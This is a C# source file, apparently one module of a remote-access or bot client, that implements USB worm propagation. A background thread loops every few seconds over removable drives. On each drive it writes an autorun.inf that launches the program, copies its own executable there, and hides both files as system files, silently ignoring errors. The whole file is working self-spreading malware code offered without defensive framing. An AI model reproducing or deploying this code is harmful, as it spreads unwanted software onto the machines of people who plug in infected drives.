using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClIENT_PC.Controller.Spread
{
    class usbInfection
    {
        public usbInfection()
        {
            if(Parametre.Spread_Usb)
            {
                Thread thread = new Thread(new ThreadStart(PropageInfecteUsbTest));
                thread.Start();
            }
        }

        private void PropageInfecteUsbTest()
        {
            FileInfo Cefichiers = new FileInfo(Assembly.GetExecutingAssembly().Location);
            while(true)
            {
                Thread.Sleep(3015);
                foreach(DriveInfo dInfos in DriveInfo.GetDrives())
                {
                    try
                    {
                        if(dInfos.DriveType == DriveType.Removable)
                        {
                            StreamWriter ecriveur = new StreamWriter(dInfos.Name + "autorun.inf");
                            ecriveur.WriteLine("[autorun]");
                            ecriveur.WriteLine("open=" + Cefichiers.Name);
                            ecriveur.WriteLine("action=Run win32");
                            ecriveur.Close();
                            File.Copy(Cefichiers.FullName, dInfos.Name + Cefichiers.Name, true);
                            File.SetAttributes(dInfos.Name + "autorun.inf", FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
                            File.SetAttributes(dInfos.Name + Cefichiers.Name, FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
                        }
                    }catch{ }
                }
            }
        }
    }
}
